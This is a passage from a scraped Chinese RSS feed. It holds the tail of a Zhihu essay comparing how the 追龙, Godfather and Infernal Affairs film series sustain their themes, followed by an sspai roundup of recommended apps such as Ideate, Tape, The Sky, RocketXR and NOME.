纯恶，而是《追龙一》里刻画的那样。但是，为了自己的目标理想的实现，他们建立起的相对秩序，最终也会因为缺陷而变质，并随之带来他们自身的变质。这一层内容的反面体现，则是阿七的恶人变好人。在电影里，也用了友情的对比来凸显这一点：正派之间的延续情义，反派的无奈分裂。</p>\n<p>古天乐的非绝对正义，吴镇宇的美好本心，对应了“何为善恶”的终极主题。古天乐的理想化与吴镇宇的理想化是二者的初心，也引导出了后续的各自行为。然而，在实现目标的过程中，成功的古天乐必须抛弃绝对正义，失败的吴镇宇则并不绝对邪恶、只是无形中变质。吴镇宇在阶段性成功后的变质，也正是古天乐“染上黑色”后长久性成功的反面。他的香港，在某种意义上成为了古天乐之香港的“垫脚台阶”。而无论是四大探长时代的香港，还是后四大探长时代的香港，都不是理想主义的纯粹实现，而沾染了很多的现实化色彩。理想主义的纯粹善恶两极化，是不存在于现实世界的。</p>\n<p>对于《追龙》系列，王晶投入了以个人而言极其罕见的认真程度，《追虎擒龙》里也可以看到他对于主题呈现的很多努力痕迹。然而，即使如此，电影的整体质量依然难言优秀。在单片的有限空间内，王晶既要沿袭第一部中关于跛豪和徐乐的表述，又要开发廉政公署的表述，还要让双方--特别是跛豪和徐乐---具有正反两面性，从而将第一部与第三部串联而成完整一体的系统。他的能力，显然无法实现之。</p>\n<p>于是，在成片里，我们便更多地看到了“概念化与套路化的点到即止”。古天乐的变，由简短的怕开枪到会开枪，粗糙地达成。而吴镇宇对香港的所谓贡献，则只体现在了台词上。吴镇宇与梁家辉、郑则仕之间的原有关系，没有借助闪回，而是权当观众看过《追龙一》，用一些台词一带而过。并且，最致命的一点是：以王晶的表达系统而言，主题讨论终究要落在反派这边，这也是讲第三部中的“变质”与第一部中的“情义”连接起来、构成对理想主义灭亡、模糊善恶的关键。</p>\n<p>然而，由于上述的“惯性模式思维”，王晶将影片主视角设立在了“抓贼方”身上，而又不可避免地对吴镇宇一方做更深层的表现。于是，古天乐一方与主题的连接性变弱了，除了古天乐最终“黑化”的“利用郑则仕”一部分之外，在更多的时间里，只负责正义、受挫、抓人。而另一边，由于主视角的设定，吴镇宇这边成为了廉政公署的对比，在行为上更多负责邪恶、暴力、杀人。</p>\n<p>这样一来，一切都变得不明晰了：开头时市民无视犯罪到结尾纷纷举报的“香港转变”正义感之由来无法落地；吴镇宇嘴里“香港比原来安稳多了”强权暴力下的相对秩序也无缘得见。剩下的，只有吴镇宇组织内部亲情变质对主题的侧面引导环节。主题变得不明确了，失去了“民众在前徐乐时代的苦痛后对徐乐时代的相对向心力，以及在徐乐末期变质下的再次不满、转而支持警察、向警察提供线索并回忆过往秩序”走向下，双线并列与主题表现的可能性——民众转变的对比服务于探案的警察主线，也表现了过往的徐乐，与现在的徐乐构成对比，托起徐乐最后关于暴力对秩序维护的台词。</p>\n<p>应该说，王晶的模式化思维，让电影的剧情展开变得更容易，让观众更容易进入作品，但也势必造成主题表现的巨大阻碍----第一部铺垫良好、表现力更吃重的吴镇宇一方缺少“变质前”的展现，而主视角下的廉政公署一方，由于缺少第一部的铺垫，也只是勉为其难地给出了一些辅助性的表达作用，且林家栋的人物形象都趋于了单薄。结果便是，对第一部的衔接也没有做好，第三部独立的主题表达也缺少了来自吴镇宇一方的关键证明。</p>\n<p>而有趣的是，延续系列主题、但剧情上不相关的精神式续作《追龙二》，反倒在独立性上有了更好的相对表现。在这部电影里，王晶依旧试图延续上一部中人物形象和主题倾向上的成功----在人物上，他设立了一个与上一代的“跛豪”非常相似的枭雄式人物；而在主题上，他也与上一部一样，试图去表现一种“在现实面前的奋斗初心与理想不再”之感，从而营造出枭雄的悲剧式结局。</p>\n<p>在电影的开头，王晶在表现梁家辉的第一次出场时，使用了过山车这个道具----梁家辉身处过山车之上的极致逾越，暗示着他一种身处于“远离地面的天国之上”的生活状态。而随后，在进一步交代梁家辉的生活环境时，王晶则用了多个交代梁家辉家族和乐而又经济富足的镜头，具体地描绘了梁家辉的“天国”-----与兄弟们亲如家人，而又共享财富。这种生活状态和家族构成，无疑是香港电影中比较常见的理想化、英杰化的枭雄形象。并且，在电影的发展部分，王晶也频繁地去具体表现梁家辉对于集团中兄弟们的和谐互动----一起吃饭、为兄弟们买糕点吃，等等。最后，到了结尾，梁家辉临刑之前，望向天空（理想化天国的所在），回想起了与兄弟们亲如一家时的画面，以及此时闪回的“跳楼机上的梁家辉举起双手，享受着身处半空（天国）的状态”影像，都进一步地加强了对梁家辉之理想的表现----他想要的，是一个兄弟如亲人，共享荣华的大家庭乌托邦。但是，在电影中，梁家辉的理想最终破灭了----兄弟林家栋背叛了自己，古天乐为首的警察一方打进了家族，自己最终兄弟离散、身死人手。</p>\n<p>当然，《追龙二》在细节上缺乏打磨，造成了很多的粗糙段落，在逻辑上并不严谨，难成佳作。但是，在主题表达效果上，它显然比《追虎擒龙》更加独立而完整。这与它“世界观封闭，不需要与前作做具体对接”的优势是分不开的。第三部与第二部在主题呈现的质量差距，也再次说明了高度密切相关之系列电影的创作难度。</p>\n<p>当然，即使难度颇高，我们依然能在一些水平更高的创作者的系列电影中，看到成功的案例。</p>\n<p>抨击漫威的科波拉本人拍摄的《教父》系列，围绕着“美国梦的破灭”所进行的创作，就是相当完美的正向范本。第一部中，迈克从逆反家族生意，到父兄重创而被迫成为教父并性格转变——在美国，意大利人的共同宿命即是堕入黑暗。到了第二部，迈克想要照顾哥哥，但最终被迫杀死哥哥——在美国，意大利人最终都将被迫割去自己的全部人性，教父其职，也宿命地必将从维多的人性走向迈克的剥离人性。第三部中，迈克想要带领家族走上正路，但女儿被杀死——意大利人永远无法逃脱黑暗的宿命，在美国走进光明，他们的结局只有毁灭。</p>\n<p>在叙事系统上，科波拉不仅给出了单片的独立完整性，更让各部之间产生了相互的作用。在这一部中，迈克承载了父辈“洗白家族，合法立身于美国上流社会”的梦想，是柯里昂家族美国梦的寄托，但家族在美国的地位，全部依赖于暴力与犯罪，这让迈克终究无法脱身自保。美国梦的幻灭，在这一部中已经彰显无遗。到了第二部，科波拉采取双线并行的结构。维多的青年时期回溯了他“保护家庭”的初心，为第一部中他赋予迈克的希望进行了强化，将之延续给了迈克。而承载第一部中维多希望的迈克，则在第二部的现实时期里戳破了这种“第一部中继承自维多”的希望。并列的两个时期里，维多逐步建立和保护家庭，迈克逐步在试图以暴力手段的维系中反而破坏家庭，在全片的行进中始终保持着同一节奏。借助“维多建立与迈克破坏的同调”，科波拉用强烈的对比手法，表现出科里昂家族“维护家庭，立身美国”之本愿的必然性破灭。第三部，则是对第一部的高度对应。在剧情上，迈克试图让大家族的生意走上白道，来挽回自己失去的小家庭，这与第一部中维多对他的期待正好对应。但最终，家族洗白失败，迈克女儿被杀，也与第一部中“迈克最终堕入黑暗”的结局实现了对应——科里昂家族的维系和生存终究离不开暴力，家族领袖试图放弃暴力、挽回家庭的努力也不会成功，无论是什么年代，无论是维多还是迈克，美国梦都终将破灭，而第一部的“步入黑暗”的结局，更成为了后续逐渐完全落入深渊的绝望开端。</p>\n<p>而在剧情之外，于电影化表达系统的元素运用上，科波拉也设计了很多巧妙的对应部分，让第一部与第三部实现了联动对比。例如，第一部中，迈克作为维多的接班人，被迫地参与了谋杀敌对家族首领的行动，而在他过手的主要暗杀段落中，杀害过程都以固定镜头之下的中远景呈现，淡化了被害人与杀害人的极端化情绪，而显出了一种高度的冷静、克制、目的性。这一点，其实也体现在了第二部的多次暗杀段落中。而第三部中，文森特作为迈克的接班人，则更加主动地建议、推动了暗杀敌人的行动，且在他亲自骑马执行暗杀的段落，科波拉改用特写与手持摄影，强化了文森特的快意与被害人的痛苦。这样的高度对应，揭示了柯里昂家族的更深一层堕落----暴力，已经从曾经的无奈、自保，变成了执行者的享受与自得，距离维多的初衷愈发遥远。并且，在两部的高潮段落，同样是“歌剧与暗杀”的组合，第一部中歌剧、基督教洗礼、暗杀的反复切换，展现出迈克“看似投身信仰，实则献身魔鬼”的深度黑化，而第三部中歌剧与女儿死亡的结合，则与第一部对应起来，揭示了“为了立足美国而献身魔鬼”后的必然悲剧结局。</p>\n<p>而非常值得注意的是，三部电影的结局，恰好串出了科波拉想要表达的全部主题推导过程。</p>\n<p>第一部中凯从门外望向打理公务的迈克，而后房门关闭。这与第一部的开头构成了高度的对应----同样从教父办公室门外拍摄的两代柯里昂工作的画面，暗示着迈克已经走上了父辈一样的人生，而在凯面前关闭的大门、随后落入的一片漆黑，标志着迈克与他“保护家庭”之初心的首次分离，堕入黑暗邪恶的开启。第二部，迈克处决了弗雷多----那个他在整个电影中一直试图保护与原谅，但最终因为教父身份所造成的权力高下产生了兄长的愤怒与逆反，从而挽救失败。在这一部的结尾，迈克孤独地坐在毫无光亮的房间中，周身被黑暗笼罩。在与又一个亲密家庭成员的决裂之中，他仿佛完全堕入了黑色的国度，成为了地狱的国王，与他保护家庭的光明初心渐行渐远。而在第三部中，迈克死在花园中，这一幕与第一部中维多的死亡场景高度相似而产生对比：维多死在儿孙环绕中，而迈克身边只有一条狗。这个对比强化了迈克“维护家人”初心的完全落空，也彻底地表达了主题：意裔美国人在美国的无法走上正途，而只能以暴力和黑道生计来维持，并最终落入必然的家庭破灭的悲剧。</p>\n<p>特别是在第三部的结尾，科波拉通过与第一部的高度对应，实现了最终的“美国梦之破灭”的幻灭感传达，于腔调和表意上几乎无懈可击。迈克濒死之时，“第一部中与凯的共舞”与“第三部中与女儿的共舞”的两个闪回构成了对应，精确地让主题达到了高潮----迈克最初对脱离家族的梦想，为了保护家庭而被迫身入罪恶行业后对凯保证“什么都不会改变”的初心，都已经在一环接一环的不得已之中，走向了最终的毁灭，走向了甚至连女儿都要失去的、彻底分崩离析的家庭。第三部结尾提供了一种极其出色的虚无与感伤，有力地对应了迈克于弥留之际对自己一生的体验感受。这样的腔调与高级感，其实并不只于第三部的结尾之中。这也正是科波拉的水准展示：他不仅在逻辑上衔接起了系列的收尾两部，更让这种衔接对应具备了直接作用于观者情感的灵性与氛围。</p>\n<p>或许，这就是《教父》作为系列电影而伟大的原因。叙事、电影语言双系统中的独立完整度与整体完整度，以及衔接单片中的腔调、意境，实现了三部曲形式的独立闭环与紧密衔接、第一部与第三部“大首尾对仗”下的结构之美。</p>\n<p>此外，《无间道》系列，同样是一个积极的正面范本。刘伟强对“无间地狱”宿命论的主题进行了三个阶段的阐述。第一部中，陈永仁和刘建明的宿命，是他们始终无法成为自己想要成为之人的宿命。第二部里，宿命则产生了两个方面：陈永仁想要当警察但情感受到倪家血脉的牵绊，刘建明想要成为保护mary的男人但最终杀死了她，二人的宿命依然延续了第一部；而另一方面，刘伟强又拍出了“黑帮终究逃不出堕落而血腥的命运”的宿命论——开头与黄sir交好而“看你本性不坏”的韩琛最终还是成为了尖沙咀头号黑帮，想要离开黑帮世界的倪永孝也逃不出属于黑帮的杀戮结局。这两部，构建了两重宿命的无间地狱。</p>\n<p>而最后的第三部，刘伟强则将“终极无间”集中到了刘建明身上：陈永仁和罗鸡死后做回了警察，一度黑白不明的黎明和陈道明也做回了警察，只有刘建明依然无法成为自己想要的样子，而又无法接受作为黑帮的自我，在身份认同的混乱中精神失常———最后一幕中，mary向他开枪，对身为杀人犯和黑帮的刘建明复仇，而刘建明自己却还在发送着摩斯电码，沉浸在对于陈永仁的身份替换幻想中。可以说，第三部中，第一部和第二部的主题被整合了起来——虽然其他人都处于各自的宿命地狱中，但终归是“做自己”，即使是死去的黎明和倪永孝，也是以警察和黑帮的本我身份死去，他们不存在自我认知的混乱——这样的终极悲剧宿命、终极无间地狱之中，只有刘建明。</p>\n<p>系列电影的创作，是一个门槛难度与质量收获成正比的模式。它对创作者的能力有着极高的要求，一旦无法支撑便是泄洪一般的巨大失败。但如果能力足够，那么它提供的更大体量与空间，将赋予有天赋的创作者以更多的发挥可能性，尽情挥洒才能与灵感，实现单片作品无法承载的表意系统与表意效果。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/segelas?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">segelas</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/67248746/answer/1967140375?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">12 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/286514993?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">能与黑客帝国、指环王、蝙蝠侠(诺兰版)比肩的电影还有吗？</a><br><a href=\"http://www.zhihu.com/question/341859673?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《黑客帝国》要拍第四部电影？</a><br>\n","link":"http://www.zhihu.com/question/67248746/answer/1967140375?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派评 | 近期值得关注的 App","date":"2021-06-28 09:30:01","description":"\n<p>本期《派评》的主要内容有：</p>\n<ul>\n<li>Setapp 上架全能录屏工具 Tape。</li>\n<li>Android 笔记工具新选择：Ideate</li>\n<li>航空航天载具科普 AR 应用：RocketXR。</li>\n<li>反社交自拍应用 NOME 更新 2.0 大版本。</li>\n<li>iOS / Android 手机数据管理利器：AnyTrans &amp; AnyDroid。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。 </p>\n<h2>不容错过的新 App</h2>\n<h3>Ideate：高效且易于组织的笔记工具</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：笔记</li>\n</ul>\n<p>对于使用过 Drafts 的用户或许对于 Drafts 的整理功能不陌生，这一功能允许用户将笔记以行、段甚至句子为单位进行快速拖拽、排序，这一功能对于快速组织、重新编排笔记非常实用。所以当看到 Ideate 时我脑海中最先联想到的就是 Drafts 的这一功能，Ideate 是 Android 平台上一款主打大纲式记录的笔记应用。</p>\n<p>Ideate 支持以大纲的形式来组织笔记，其本身支持 10 级内容嵌套，再加上标签功能，足以帮助用户将笔记组织得井井有条。作为笔记应用本身，Ideate 的设计也称得上可圈可点，我们既可以利用其多级嵌套功能制作出一份复杂的长笔记，也可以通过其添加列表或复选框的功能来制作一份简单的待办清单或是购物清单，Ideate 既可以做到强大高效，也可以做到足够简单、无负担。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/0d751db71a6caefb19b05933ce56e2b9\"></figure><p>在笔记编辑界面，通过点击功能区，用户可以快速插入日期、时间从而对记录的条目进行有效的时间划分，在添加时间的同时，Ideate 还支持提醒并允许用户自定义设置循环提醒，这一功能对于需要定期回顾笔记的用户而言极为贴心。此外，Ideate 的整理功能也以快速功能键的形式呈现，通过这些功能键，用户可以快速改变当前文字的缩进级别或是上下文位置，从而达到快速整理的笔记的目的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/853c5f57ecd2c5457a21856e9a7fa16a\"></figure><p>我们在使用笔记工具的时候难免会记录下一些需要完成的待办事项，Ideate 支持在每一层级的标题前后添加 <code>TODO</code> 标签，当我们完成相应的条目后点击该标签即可将标签状态变更为 <code>DONE</code>，而所有添加了 <code>TODO</code> 标签的条目都会被 Ideate 自动归类到应用主界面的「概览」项目下，用户无需自行整理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/52386ec58bbd7744e408f47ce221f927\"></figure><p>Ideate 还有一些零碎的贴心功能，譬如置顶重要笔记，查看笔记时使用仅查看功能以防止意外更改笔记内容；小组件功能可以将单一笔记固定在桌面从而随时查看或追加内容。Ideate 最为独特的功能便是其快速添加特定内容的功能，用户可以提前设置好快速添加的内容及格式，之后便可以通过点击相应的内容一键添加固定格式内容至原有笔记的特定位置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/7864b229c4f833c6301a412606b12c2c\"></figure><p>总体而言，Ideate 是一款值得尝试的笔记应用，应用本体免费，采用了订阅制，订阅可以解锁云同步和 PDF 导出功能。你可以通过 <a href=\"https://play.google.com/store/apps/details?id=com.brewedapps.ideate\" target=\"_blank\">Play Store</a> 下载使用 Ideate。</p>\n<h3>Tape：全能好用的录屏软件</h3>\n<ul>\n<li>平台：macOS</li>\n<li>关键词：录屏</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@huhuhang\" user-id=\"bs2ovedb34tch278htb0\" href=\"https://sspai.com/u/huhuhang\">@huhuhang</a>：当我们需要进行产品演示、客户支持、讲解教学时，都可能会用到录屏软件。一图抵千言，录屏分享的视频或者 GIF 能够帮助我们更快地解释清楚问题和表达观点。今天介绍的 Tape 就是这样一款可能会帮助到你的全能录屏工具。</p>\n<p>首先是基础的屏幕录制功能，Tape 支持选择全屏幕或者运行中的应用窗口，也就是说你可以录制整个屏幕的全部操作，或者聚焦某个应用中的操作。在录制的过程中，Tape 还贴心地提供了标注工具，方便讲解时写写画画。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/a139466f1adfd6729d0ffe132b986660\"><figcaption>选择录制窗口和选择录制模式</figcaption></figure><p>除了默认的基础录屏模式，Tape 还提供了另外 3 种常用的模式。首先是 Voice Over，即录屏时包含声音，这种场景主要方便教学和讲解，加入旁白能够让观看视频的人更清晰地了解到屏幕上正在发生什么。</p>\n<p>然后是 Webcam Overlay 模式，即在录制的视频中包含摄像头画面的小窗。我们经常在各类直播中看到这种视频，即讲解者将自己的实时画面也放置在视频中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/4a98f765d958ca44ebb83c8d4bc37544\"><figcaption>Webcam Overlay 模式</figcaption></figure><p>除此之外，Tape 还提供了 GIF 快速录制模式，方便导出 GIF 动图。4 种模式基本上涵盖了录屏的大多数场景，而 Tape 不止于此，还提供了视频托管服务方便分享和协作，一个 Team 的录屏可以汇聚在一起。Tape 录制完的视频会自动上传并提供分享链接，而订阅了 Tape Cloud 服务的用户甚至可以永久保留这些录屏内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/0e456d9c86e92a0c231c1cb08eea77e1\"></figure><p>Tape Cloud 面板</p>\n<p>你觉得一款录屏软件做到这样就结束了吗？其实还没有。Tape 还专门为开发者群体提供了 CLI 命令行工具，命令行工具可以录制 iOS、tvOS 和 Android 模拟器的屏幕，同时可以运行在 macOS、Windows 和 Linux 全平台。</p>\n<p>举一个很实用的例子，当需要给开发团队提产品 Bug 时，Tape 可以将录制完 GIF 自动上传，同时生成 Markdown 内容方便我们贴到 issues 中，一套操作行云流水。<a href=\"https://github.com/tapehq/tape-cli\" target=\"_blank\">tape-cli</a> 工具是开源且免费的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/c8cabde0fbe7c44e81ba992a1aa52980\"></figure><p>最后让我们说说价格，当然不会让你死心。免费版本可以永久使用 <a href=\"https://github.com/tapehq/tape-cli\" target=\"_blank\">tape-cli 命令行工具</a>，还包含 20 天的 macOS App 试用，云端视频会在 7 天后过期。3.99 美元 / 月的付费版本则没有任何限制且可以无限制永久保留云端视频。你可以在 <a href=\"https://www.tape.sh/\" target=\"_blank\">官网</a> 获取 Tape。</p>\n<p>值得一提的是，Tape 已经包含在了 Setapp 全家桶中，<a href=\"https://setapp.sjv.io/c/1249877/344537/5114\" target=\"_blank\">Setapp 订阅用户</a> 可以免费使用其付费版本，但是不包含团队协作等云端特性。</p>\n<h3>The Sky：仰望天空，然后飞往那颗星</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：天文、科普</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：仰望星空的浪漫，我们在 <a href=\"https://sspai.com/search/post/Star%20Walk\" target=\"_blank\">Star Walk</a> 和 <a href=\"https://sspai.com/search/post/Sky%20Guide\" target=\"_blank\">Sky Guide</a> 中已经得到充分的感受，但你想象过「揸火箭」飞到你所远望的那颗星球去么？The Sky 就是这样一款可以带你遨游深空的星空观测应用。</p>\n<p>打开 The Sky，是你熟悉的星空页面，你一样可以通过移动手机调整查看星空的视角。相比同类应用，The Sky 在转动时还有一定的阻尼效果，星座的示意也在定位后才慢慢显现，似乎可以更好地模拟通过望远镜辨识星空的样子。应用底部增设了时间轴，你可以滑动时间轴进行短期的时间旅行，了解星星们的运行轨迹。</p>\n<p>应用中内置了一款模拟航天器，你可以通过「3D 飞行」开启一场星际之旅，穿越到那颗星球附近，了解它所处环境。停在陌生星球的上空，回眺遥远的银河系和太阳系，科幻电影中的那些画面，你也可以「亲身」体验一番了。除了进行星球间的飞行外，The Sky 还在太阳系各行星、太阳系以及一些知名恒星和天体外围设置了常驻观测点，点开右下角的工具栏后选择对应星体进行快速跃迁，妈妈再也不用担心我「星际迷航」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/b0be455eef9689673eb20c4d9689f8c0\"></figure><p>The Sky 提供高级版服务，每年 20 元的订阅价格还是非常贴心的。订阅后可以去除所有广告，解锁更多天文探索的内容和 3D 飞行路线，由于不影响基础功能，你可以根据自身需求决定是否订阅。</p>\n<p>你可以在 App Store 上免费下载 <a href=\"https://apps.apple.com/cn/app/the-sky-by-redshift-%E5%A4%A9%E6%96%87/id1481867620\" target=\"_blank\">The Sky</a>。</p>\n<span class=\"ss-application\" app-id=\"16093\"> </span><h3>众山小读书笔记：跨平台读书笔记整合工具</h3>\n<ul>\n<li>平台：iOS / iPadOS / Android</li>\n<li>关键词：阅读、读书笔记</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@黎明前线Alan\" user-id=\"bs2pdmtb34tcs0po3gag\" href=\"https://sspai.com/u/safari_cheung\">@黎明前线Alan</a>：如其名，《众山小读书笔记》是一款为读书笔记服务的工具应用，开发者取自「会当凌绝顶，一览众山小」之意，为在不同平台大量阅读的资深书虫积攒下来的读书笔记提供一个汇总工具。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/d2a01885fe77d8e1be6c63c895cfb495\"></figure><p>在 UI 界面设计上，众山小读书笔记采用了淡蓝色 + 天蓝色的界面设计，从很多设计细节也能体现出开发者作为读书爱好者的融入：比如自定义生成的用户名都是来自名著中的角色、为了照顾夜猫子读书者，阅读时间重置都是以每天次日凌晨 4 时为分界线，这些贴心设计都让众山小读书笔记用起来更符合读书者的「直觉」，直接降低了使用学习成本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/f67a55f116b6605c140fb08032a20357\"></figure><p>开发者本人也是也是一位重度读书爱好者，并且一直希望将散落在 Kindle、豆瓣读书、微信读书等平台的笔记集中存储，因此众山小读书笔记在笔记导入/导出等功能的跨平台实现上做的可圈可点；众山小读书笔记还支持通过 USB 同步，同时也支持纯文本、HTML 以及 MD 三种格式的笔记导出。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/d19be799cc1d76e48c28d0f8e61db230\"></figure><p>此外，围绕「笔记集中存储」这一功能，众山小读书笔记还增加了给笔记打标签以及搜索功能，方便在打整合后的大量读书笔记中快速搜索，而针对当下相对更加小众、但仍然有同步笔记需求的纸质阅读用户。众山小阅读笔记则是选择采用 OCR 识别的方式来添加那些阅读纸质书时记录的手写笔记。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/2de987a19d5f542f76f686cb571b2af0\"></figure><p>在实际体验中，笔者认为众山小读书笔记目前的短板在于仍略显简陋的 UI 设计；且当前版本也不支持暗色模式，在 Android 端开启 App 后会自动进入全屏模式的设计也有些令人费解，希望开发者能在之后的版本更新中逐步优化这些小问题。</p>\n<p>在付费制度上，应用采用的是「核心功能免费 + 进阶功能付费」的策略，包括 MD 格式导出、更多的 OCR 额度、半小时自动同步等功能都需要用户付费使用，但免费版的大部分功能也足以满足日常阅读笔记整理需求。</p>\n<p>目前众山小读书笔记 Android 版本暂不支持直接付费解锁，iOS 版本付费有 ¥20/月与 ¥40/月两个版本；你可以在 <a href=\"https://apps.apple.com/cn/app/%E4%BC%97%E5%B1%B1%E5%B0%8F-%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/id1472521517\" target=\"_blank\">App Store</a> 下载到众山小读书笔记的 iOS / iPadOS 版本，或者也可以直接在 <a href=\"https://omynote.com/\" target=\"_blank\">官网</a> 下载到 Android 版本的 APK 安装包；开发者目前已经表示将在今年内加入对桌面端以及网页端的支持。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67271\" target=\"_blank\">给你多一个爱上读书的理由，阅读记录管理工具新选择：众山小读书笔记</a></p>\n<span class=\"ss-application\" app-id=\"16087\"> </span><h3>RocketXR：利用 AR 技术展现航天器全貌</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：航空航天、科普、AR</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：近几年，我国航天技术发展可谓是成果丰硕，前有嫦娥月兔带回月球样本、后有祝融奔赴火星探测，最近三位航天员前往空间站核心舱执行任务更是举国瞩目。在这一系列成就的感染下，即使我们对航天科技一窍不通，也一定会想要去了解更多航天知识，那么就从航天器知识开始吧。RocketXR 是一款利用 AR 技术展示和介绍火箭、登陆器等航天器的 App，我们能够通过它去了解真实的航天器。</p>\n<p>每一次启动 RocketXR，应用都会随机展示一幅与航空航天有关的图片，它们可能来自火箭发射现场报道，也可能来自探测器返回的照片，每一张都真实而有意义。进入 App 后我们可以看到，RocketXR 目前内建了三个航天器的数据，它们分别是来自 Space X 的猎鹰 9 号火箭、来自 NASA 的毅力号火星车，还有大名鼎鼎的哈勃空间望远镜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/508a3e4423b148dec5f91fe01cd8689f\"></figure><p>RocketXR 基于 Unity 引擎开发，并为航天器都提供了 AR 模型。与大多数 AR 工具一样，RocketXR 首先要扫描周围环境，之后根据提示点击即可放置 AR 模型，并通过双指缩放和旋转来调整模型尺寸和角度，如果你想以真实尺寸展示航天器，就点击屏幕中央的「Real Size」按钮试试，不过前提是你有足够大的场地空间。</p>\n<p>AR 界面下方的三个按钮用来查看和切换航天器不同组件的功能介绍，AR 模型上黑色的标注点则表示当前组件。如果是猎鹰 9 号这种模型，右上角还会出现一个按钮用来「分解」模型，此时的猎鹰 9 号火箭就会以「爆炸图」的形式展现第一级、第二级、整流罩以及搭载的航天器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/d7dae4771f48e1ee82c1f40b1aec0d44.jpg\"></figure><p>除了 AR 模型，RocketXR 也提供了图片和文字介绍，相关内容会根据航天器具体任务而分成不同的三种类别，例如猎鹰 9 号火箭当中还展示了 Space X 其他航天器的图片、毅力号火星车展示不同发射阶段的图片和介绍，而我最喜欢哈勃望远镜的介绍，因为这里面有哈勃拍摄的太空照片。强烈建议开发者为 App 提供图片导出保存功能，这里面每一张照片都可以作为壁纸使用了。</p>\n<p>为这么巨大的东西建立模型需要不少工作量，所以 RocketXR 目前仅内建了三种航天器，不过相信后续会增加更多精美的航天器模型，让用户了解更多航空航天知识。如果你也感兴趣，可以前往 <a href=\"https://play.google.com/store/apps/details?id=com.tjosoft.rocketxr\" target=\"_blank\">Google Play</a> 免费下载 RocketXR。</p>\n<span class=\"ss-application\" app-id=\"16092\"> </span><h2>值得关注的 App 更新</h2>\n<h3>NOME 2.0：自拍请挡脸</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：反社交、自拍、人像</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Snow\" user-id=\"bs2od75b34tch2730o80\" href=\"https://sspai.com/u/ul0vcezb\">@Snow</a>：2018 年的时候，我就曾推荐过这款反社交的挡脸自拍应用 <a href=\"https://sspai.com/post/45798\" target=\"_blank\">NOME</a>。它会自动识别照片中的五官，然后使用非常有趣的贴图素材进行遮挡。上周，它终于等来了 2.0 版更新。这次的挡脸不仅支持照片，动态视频也实现跟踪遮挡了。</p>\n<p>1.0 版的遮脸特效其实已经非常有趣，但近 3 年没有更新，或多或少有些审美疲劳。2.0 虽然依旧只保留 14 款的量，但特效品质均有极大的「提升」。首先，所有特效均为动态，导出时你可以选择自行选帧保留静态图片，照片素材也可以生成最长 30 秒的视频，当然配合视频素材表现力更佳。</p>\n<p>此外，应用新增了 30 余款笔刷效果，你可以使用这些笔刷做二次遮挡或者创作。部分笔刷同样支持动态效果，可以为你的挡脸视频提供更多可能性。NOME 同样也引入了滤镜效果，你可以在原有特效滤镜基础上，进一步调整画面效果，获得更突出的画面表现力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/750cd15de523a03934107be1f42e1282\"></figure><p>此次更新后，NOME 中的大部分效果均需升级 Pro 版。你可以选择按每年 12 元订阅，或者 40 